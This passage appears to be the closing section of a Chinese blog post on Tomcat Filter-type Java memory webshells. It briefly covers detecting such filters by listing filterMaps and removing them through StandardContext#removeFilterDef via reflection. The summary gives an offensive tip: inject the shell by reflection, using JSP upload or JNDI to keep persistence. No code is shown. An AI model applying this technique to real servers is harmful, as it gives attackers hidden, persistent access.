检测是通过遍历`filterMaps`中的所有`filterMap`然后显示出来，由我们自行判断。

![1](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/FilterMapScan.png)

删除则是主要通过反射调用`StandardContext#removeFilterDef`方法来进行删除。

![1](https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/InvokerScanner.png)

## 总结

Filter 型内存马的注入主要是获取`StandardContext`，然后通过反射注入。在实战中可以通过上传 JSP 文件，如果有 JNDI 也可以尝试通过 JNDI 来注入内存马实现持久化。













































